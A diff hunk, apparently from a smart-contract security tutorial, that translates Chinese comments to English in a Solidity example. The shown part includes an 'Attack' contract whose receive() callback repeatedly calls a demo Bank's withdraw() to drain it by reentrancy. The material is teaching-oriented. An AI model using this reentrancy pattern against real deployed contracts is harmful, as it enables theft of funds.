@@ -22,21 +22,21 @@ contract Bank {
         balanceOf[msg.sender] = 0;
     }
 
-    // 获取银行合约的余额
+    // Get the balance of the bank contract
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 
 contract Attack {
-    Bank public bank; // Bank合约地址
+    Bank public bank; // Bank contract address
 
-    // 初始化Bank合约地址
+    // Initialize the Bank contract address
     constructor(Bank _bank) {
         bank = _bank;
     }
     
-    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
+    // Callback function, used for re-entry attack on Bank contract, repeatedly calling the target’s withdraw function
     receive() external payable {
         if (address(bank).balance >= 1 ether) {
             bank.withdraw();
